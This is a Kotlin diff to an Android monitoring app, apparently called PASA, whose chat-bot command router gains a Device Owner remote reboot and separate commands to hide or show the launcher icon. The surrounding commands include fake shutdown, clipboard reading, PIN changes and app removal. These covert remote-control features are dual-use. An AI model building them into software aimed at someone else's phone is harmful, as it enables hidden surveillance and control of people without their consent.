@@ -17,6 +17,7 @@ import okhttp3.MultipartBody
 import okhttp3.RequestBody.Companion.asRequestBody
 import okhttp3.RequestBody.Companion.toRequestBody
 import java.io.File
+import kotlinx.coroutines.*
 import javax.inject.Inject
 import javax.inject.Singleton
 
@@ -402,6 +403,27 @@ class CommandExecutor @Inject constructor(
             "/set_os_pin", "/set_pin", "/reset_pin" -> setOsPinCommand
             "/unlock" -> unlockCommand
             "/device_owner", "/owner", "/kiosk" -> deviceOwnerCommand
+            "/reboot", "/restart" -> object : Command {
+                override val name = "/reboot"
+                override val description = "Remotely restart device (Device Owner)"
+                override val usage = "/reboot"
+                override suspend fun execute(args: List<String>, chatId: Long): com.izhaanintellect.pasa.commands.CommandResult {
+                    if (!com.izhaanintellect.pasa.admin.PasaDeviceAdmin.isDeviceOwner(context)) {
+                        return com.izhaanintellect.pasa.commands.CommandResult(
+                            success = false,
+                            message = "❌ <b>Reboot Failed:</b> Android Enterprise Device Owner is required to trigger remote hardware reboot.\nCheck status with <code>/device_owner</code>."
+                        )
+                    }
+                    kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
+                        kotlinx.coroutines.delay(1500L)
+                        com.izhaanintellect.pasa.admin.PasaDeviceAdmin.rebootDevice(context)
+                    }
+                    return com.izhaanintellect.pasa.commands.CommandResult(
+                        success = true,
+                        message = "🔄 <b>Hardware Reboot Initiated</b>\n━━━━━━━━━━━━━━━━━━━━\nDevice Owner is restarting your phone now.\nPASA will automatically resume monitoring upon boot."
+                    )
+                }
+            }
             "/fakeshutdown", "/blackout", "/fake_off" -> fakeShutdownCommand
             "/wake", "/wake_up" -> object : Command {
                 override val name = "/wake"
@@ -443,7 +465,19 @@ class CommandExecutor @Inject constructor(
             "/apps", "/app_uninstall" -> appManageCommand
             "/message", "/msg", "/broadcast", "/alert_screen" -> messageCommand
             "/clipboard", "/clip", "/paste" -> clipboardCommand
-            "/hide", "/show", "/stealth" -> stealthCommand
+            "/hide" -> object : Command {
+                override val name = "/hide"
+                override val description = "Hide launcher icon"
+                override val usage = "/hide"
+                override suspend fun execute(args: List<String>, chatId: Long) = stealthCommand.execute(listOf("hide"), chatId)
+            }
+            "/show" -> object : Command {
+                override val name = "/show"
+                override val description = "Show launcher icon"
+                override val usage = "/show"
+                override suspend fun execute(args: List<String>, chatId: Long) = stealthCommand.execute(listOf("show"), chatId)
+            }
+            "/stealth" -> stealthCommand
             "/selftest", "/health", "/diagnostics" -> selfTestCommand
             "/help", "/start" -> helpCommand
             else -> null
